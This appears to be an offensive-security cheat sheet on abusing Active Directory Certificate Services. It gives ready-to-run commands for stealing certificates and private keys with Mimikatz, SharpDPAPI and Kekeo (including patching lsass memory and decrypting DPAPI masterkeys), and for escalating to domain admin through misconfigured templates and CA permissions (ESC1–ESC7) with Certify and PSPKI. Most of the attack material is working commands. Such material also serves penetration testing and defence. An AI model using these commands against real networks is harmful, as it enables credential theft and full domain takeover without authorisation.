# AD CS Abuse

* <mark style="color:green;">**AD CS**</mark> <mark style="color:green;"></mark><mark style="color:green;">:</mark> Active Directory Certificate Services
* <mark style="color:green;">**CA**</mark> <mark style="color:green;"></mark><mark style="color:green;">:</mark> Certification Authority
* <mark style="color:green;">**EKU**</mark> <mark style="color:green;"></mark><mark style="color:green;"></mark> : Extended Key Usage
* <mark style="color:green;">**SAN**</mark> <mark style="color:green;"></mark><mark style="color:green;"></mark> : Subject Alternative Name (subjectAltName)
* <mark style="color:green;">**CSR**</mark> : Certificate Signing Request
* <mark style="color:green;">**CES**</mark> : Certificate Enrollment Web Service
* <mark style="color:green;">**CAPI**</mark> : CryptoAPI
* <mark style="color:green;">**CNG**</mark> : Cryptography API: Next Generation

#### <mark style="color:green;">EKU OIDs that can enable certificate authentication:</mark>

| Description                  | OID                      |
| ---------------------------- | ------------------------ |
| Client Authentication        | `1.3.6.1.5.5.7.3.2`      |
| PKINIT Client Authentication | `1.3.6.1.5.2.3.4`        |
| Smart Card Logon             | `1.3.6.1.4.1.311.20.2.2` |
| Any Purpose EKU              | `2.5.29.37.0`            |
| Subordinate CA certificate   | No EKU set               |

## <mark style="color:red;">Enumerate AD CS</mark>

Enumerate AD Enterprise CAs and their settings with LDAP:

```powershell
$CAs = Get-ADObject -LDAPFilter '(objectCategory=pKIEnrollmentService)' -SearchBase "CN=Configuration,DC=tinycorp,DC=net"
$CAs
```

Get list of template names:

```powershell
$CATemplateNames = Get-ADObject $CAs[0].DistinguishedName -Properties certificatetemplates | Select-Object -ExpandProperty certificatetemplates
$CATemplateNames
Or
$ windapsearch --dc 192.168.1.11 -d megacorp.local -u snovvcrash -p 'Passw0rd!' -m custom --filter '(objectCategory=pKIEnrollmentService)' --base 'CN=Configuration,DC=megacorp,DC=local' --attrs dn,dnshostname
$ windapsearch --dc 192.168.1.11 -d megacorp.local -u snovvcrash -p 'Passw0rd!' -m custom --filter '(distinguishedName=CN=CA01,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=megacorp,DC=local)' --base 'CN=Configuration,DC=megacorp,DC=local' --attrs certificateTemplates
```

Enumerate AD Enterprise CAs with certutil from a domain-joined machine:

```
Cmd > certutil.exe -config - -ping
Cmd > certutil.exe -TCAInfo [-v]
```

## <mark style="color:red;">Hunt for Certificates</mark> <a href="#hunt-for-certificates" id="hunt-for-certificates"></a>

### <mark style="color:orange;">Export Certificates (THEFT1)</mark> <a href="#export-certificates-theft-1" id="export-certificates-theft-1"></a>

Export a certificate from user's context.

With certmgr:

* Run → `certmgr.msc` → Action → All Tasks → Export ...

With PowerShell:

```powershell
 Export-PfxCertificate -Password (Read-Host -AsSecureString -Prompt 'Password') -Cert (Get-Item -Path Cert:\LocalMachine\My\<CERT_THUMBPRINT>) -FilePath cert.pfx -Verbose
```

With [CertStealer](https://github.com/TheWover/CertStealer):

```
Cmd > .\CertStealer.exe -export pfx <CERT_THUMBPRINT>
```

If the private key is non-exportable, use Mimikatz's `crypto::capi` (to patch CAPI in current process) or `crypto::cng` (to patch `lsass.exe` memory):

```
Cmd > .\mimikatz.exe "crypto::capi" "crypto::certificates /export" "exit"
```

### <mark style="color:orange;">DPAPI User Keys (THEFT2)</mark> <a href="#dpapi-user-keys-theft-2" id="dpapi-user-keys-theft-2"></a>

Decrypt a domain user's masterkey with domain's backup key with Mimikatz:

```
Cmd > .\mimikatz.exe "dpapi::masterkey /in:C:\path\to\masterkey /rpc" "exit"
```

Decrypt masterkey if user's plaintext password is known with Mimikatz:

```
Cmd > .\mimikatz.exe "dpapi::masterkey /in:C:\path\to\masterkey /sid:<ACCOUNT_SID> /password:Passw0rd!" "exit"
```

Simplify the process with SharpDPAPI providing it a file with one or more `{GUID}:SHA1` masterkey mappings (will output a `.pem` file):

```
Cmd > .\SharpDPAPI.exe certificates /mkfile:C:\Temp\mkeys.txt
```

### <mark style="color:orange;">DPAPI Machine Keys (THEFT3)</mark> <a href="#dpapi-machine-keys-theft-3" id="dpapi-machine-keys-theft-3"></a>

It's not possible to decrypt machine keys using the domain's DPAPI backup key, so the adversary can use the `DPAPI_SYSTEM` LSA secret on the system which is accessible only by the SYSTEM user:

```
 # While elevated
Cmd > .\SharpDPAPI.exe certificates /machine
```

After converting the output to `.pfx` and if the appropriate EKU scenario is present, the adversary can use that `.pfx` for domain authentication _as the computer account_ (see **PERSIST2**).

### <mark style="color:orange;">Search for Certificate Files (THEFT4)</mark> <a href="#search-for-certificate-files-theft-4" id="search-for-certificate-files-theft-4"></a>

Find certificate files lying around with Seatbelt:

```
Cmd > .\Seatbelt.exe "dir C:\ 10 \.(pfx|pem|p12)`$ false"
Cmd > .\Seatbelt.exe InterestingFiles
```

Some other certificate-related file extensions:

| File Extension             | Description                                                               |
| -------------------------- | ------------------------------------------------------------------------- |
| `.key`                     | The private key.                                                          |
| `.crt`/`.cer`              | The certificate.                                                          |
| `.csr`                     | Signing request file. Does not contain certificates or keys.              |
| `.jks`/`.keystore`/`.keys` | Java Keystore. May contain certificates + private keys used by Java apps. |

List EKUs for a certificate with PowerShell:

```powershell
PS > $CertPath = "C:\Users\snovvcrash\cert.pfx"
PS > $CertPass = "Passw0rd!"
PS > $Cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 @($CertPath, $CertPass)
PS > $Cert.EnhancedKeyUsageList
```

Parse `.pfx` with certutil:

```
Cmd > certutil.exe -dump -v cert.pfx
```

Correlate a certificate with a CA thumbprint on the host and in AD:

```powershell
 # Get cert's thumbprint
PS > $CertPath = "C:\Users\snovvcrash\cert.p12"
PS > $CertPass = "Passw0rd!"
PS > $Cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2 @($CertPath, $CertPass)
PS > $Cert.Thumbprint
 # Match it with CA certs' thumbprints trusted by the current host
Cmd > .\Seatbelt.exe -q CertificateThumbprints
 # Match it with CA certs' thumbprints from AD
Cmd > .\Certify.exe find /quiet
```

## <mark style="color:red;">Steal NTLM via PKINIT (THEFT5)</mark> <a href="#steal-ntlm-via-pkinit-theft-5" id="steal-ntlm-via-pkinit-theft-5"></a>

Request NTLM hash when the account is authenticated with a TGT through PKINIT with Kekeo:

```
Cmd > .\kekeo.exe "tgt::pac /caname:CA01 /domain:megacorp.local /subject:snovvcrash /castore:current_user" "exit"
```

## <mark style="color:red;">Domain Escalation via Certificates</mark> <a href="#domain-escalation-via-certificates" id="domain-escalation-via-certificates"></a>

Discover vulnerable templates:

```
Cmd > .\Certify.exe find /vulnerable
```

### <mark style="color:orange;">Modifiable SAN + Smart Card Logon or Client Authentication or PKINIT Client Authentication EKUs (ESC1)</mark> <a href="#modifiable-san-smart-card-logon-or-client-authentication-or-pkinit-client-authentication-ekus-esc-1" id="modifiable-san-smart-card-logon-or-client-authentication-or-pkinit-client-authentication-ekus-esc-1"></a>

Condition: the vulnerable certificate template allows requesters to specify a SAN in the CSR as well as allows Smart Card Logon (`1.3.6.1.4.1.311.20.2.2`) or Client Authentication (`1.3.6.1.5.5.7.3.2`) or PKINIT Client Authentication (`1.3.6.1.5.2.3.4`) EKUs.

Find template with this misconfiguration:

```powershell
PS > Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2) (pkiextendedkeyusage=1.3.6.1.5.2.3.4))(mspki-certificate-name-flag:1.2.840.113556.1.4.804:=1))' -SearchBase 'CN=Configuration,DC=megacorp,DC=local'
```

Request a certificate specifying the `/altname` as a domain admin:

```
Cmd > .\Certify.exe request /ca:CA01.megacorp.local\CA01 /template:VulnTemplate /altname:DomAdmin
```

### <mark style="color:orange;">Modifiable SAN + Any Purpose EKU (ESC2)</mark> <a href="#modifiable-san-any-purpose-eku-esc-2" id="modifiable-san-any-purpose-eku-esc-2"></a>

Condition: the vulnerable certificate template allows requesters to specify a SAN in the CSR as well as allows Any Purpose EKU (`2.5.29.37.0`).

Find template with this misconfiguration:

```powershell
PS > Get-ADObject -LDAPFilter '(&(objectclass=pkicertificatetemplate)(!(mspki-enrollment-flag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-ra-signature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))' -SearchBase 'CN=Configuration,DC=megacorp,DC=local'
```

Request a certificate specifying the `/altname` as a domain admin like in **ESC1**.

### <mark style="color:orange;">Agent Certificate + Enroll on Behalf of Another User (ESC3)</mark> <a href="#agent-certificate-enroll-on-behalf-of-another-user-esc-3" id="agent-certificate-enroll-on-behalf-of-another-user-esc-3"></a>

Conditions:

1. A template allows a low-privileged user to use an enrollment agent certificate.
2. Another template allows a low privileged user to use the enrollment agent certificate to request a certificate on behalf of another user, and the template defines an EKU that allows for domain authentication.

1\. Request an enrollment agent certificate:

```
Cmd > .\Certify.exe request /ca:CA01.megacorp.local\CA01 /template:Vuln-EnrollAgentTemplate
```

2\. Request a certificate on behalf of another to a template that allow for domain authentication:

```
Cmd > .\Certify.exe request /ca:CA01.megacorp.local\CA01 /template:User /onbehalfon:MEGACORP\ITAdmin /enrollcert:enrollmentAgentCert.pfx /enrollcertpw:Passw0rd!
```

### <mark style="color:orange;">Vulnerable Certificate Template ACEs (ESC4)</mark> <a href="#vulnerable-certificate-template-aces-esc-4" id="vulnerable-certificate-template-aces-esc-4"></a>

* ​[https://github.com/cfalta/PoshADCS](https://github.com/cfalta/PoshADCS)​

| Right           | Description                                                    |
| --------------- | -------------------------------------------------------------- |
| `Owner`         | Implicit full control of the object, can edit any properties.  |
| `FullControl`   | Full control of the object, can edit any properties.           |
| `WriteOwner`    | Can modify the owner to an adversary-controlled principal.     |
| `WriteDacl`     | Can modify access control to grant an adversary `FullControl`. |
| `WriteProperty` | Can edit any properties.                                       |

### <mark style="color:orange;">Vulnerable PKI Object ACEs (ESC5)</mark> <a href="#vulnerable-pki-object-aces-esc-5" id="vulnerable-pki-object-aces-esc-5"></a>

#### `EDITF_ATTRIBUTESUBJECTALTNAME2` (ESC6) <a href="#editf_attributesubjectaltname2-esc-6" id="editf_attributesubjectaltname2-esc-6"></a>

> If this flag is set on the CA, any request (including when the subject is built from Active Directory) can have user defined values in the subject alternative name.

This means that an adversary can enroll in **any** template configured for domain authentication that also allows unprivileged users to enroll (e.g., the default `User` template) and obtain a certificate that allows to authenticate as a domain admin or any other active user/machine.

Discover with certutil:

```
Cmd > certutil.exe -config "CA01.megacorp.local\CA01" -getreg "policy\EditFlags"
Or
Cmd > reg.exe query \\CA01.megacorp.local\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\CA01\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```

Discover with Certify:

```
Cmd > .\Certify.exe find
```

To abuse request a certificate specifying an `/altname` with any template that allows for domain auth (e.g., the default `User` template which normally doesn't allow to specify alternative names):

```
Cmd > .\Certify.exe request /ca:CA01.megacorp.local\CA01 /template:User /altname:DomAdmin
```

This setting can be set with domain admin's privileges like this (_dangerous, do not do this!_):

```
Cmd > certutil.exe -config "CA01.megacorp.local\CA01" -setreg "policy\EditFlags" +EDITF_ATTRIBUTESUBJECTALTNAME2
```

Remove this setting:

```
Cmd > certutil.exe -config "CA01.megacorp.local\CA01" -setreg "policy\EditFlags" -EDITF_ATTRIBUTESUBJECTALTNAME2
```

### <mark style="color:orange;">Vulnerable CA ACEs (ESC7)</mark> <a href="#vulnerable-ca-aces-esc-7" id="vulnerable-ca-aces-esc-7"></a>

Enumarate CA ACEs with Powershell [PSPKI](https://github.com/PKISolutions/PSPKI):

```powershell
PS > Install-Module -Name PSPKI
PS > Import-Module PSPKI
PSPKI > Get-CertificationAuthority -ComputerName CA01.megacorp.local | Get-CertificationAuthorityAcl | select -ExpandProperty access
```

`ManageCA` and `ManageCertificates` rights translate to the "CA Administrator" and "Certificate Manager" ("CA Officer") respectively.

The "CA Administrator" role allows to set the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag (see **ESC6**):

```powershell
 # Check before setting the flag
Cmd > hostname
DC01
Cmd > certutil.exe -config "CA01.megacorp.local\CA01" -getreg "policy\EditFlags"
​
 # Invoke SetConfigEntry
PS > "$(hostname) : $(whoami)"
WS01 : megacorp\CertAdmin
PSPKI > $configReader = New-Object SysadminsLV.PKI.Dcom.Implementation.CertSrvRegManagerD "CA01.megacorp.local"
PSPKI > $configReader.SetRootNode($true)
PSPKI > $configReader.GetConfigEntry("EditFlags", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
1114446
PSPKI > $configReader.SetConfigEntry(1376590, "EditFlags", "PolicyModules\CertificateAuthority_MicrosoftDefault.Policy")
​
 # Check after setting the flag (EDITF_ATTRIBUTESUBJECTALTNAME2 should appear in the output)
Cmd > hostname
DC01
Cmd > certutil.exe -config "CA01.megacorp.local\CA01" -getreg "policy\EditFlags"
```

The "Certificate Manager" role allows to remotely approve pending certificate requests which can by used by an adversary to subvert the "CA certificate manager approval" protection:

```powershell
 # Request a certificate that requires manager approval with Certify
PS > .\Certify.exe request /ca:CA01.megacorp.local\CA01 /template:ApprovalNeeded
...
[*] Request ID : 1337
​
 # Approve a pending request with PSPKI
PSPKI > Get-CertificationAuthority -ComputerName CA01.megacorp.local | Get-PendingRequest -RequestID 1337 | Approve-CertificateRequest
​
 # Download the issued certificate with Certify
PS > .\Certify.exe download /ca:CA01.megacorp.local\CA01 /id:1337
```
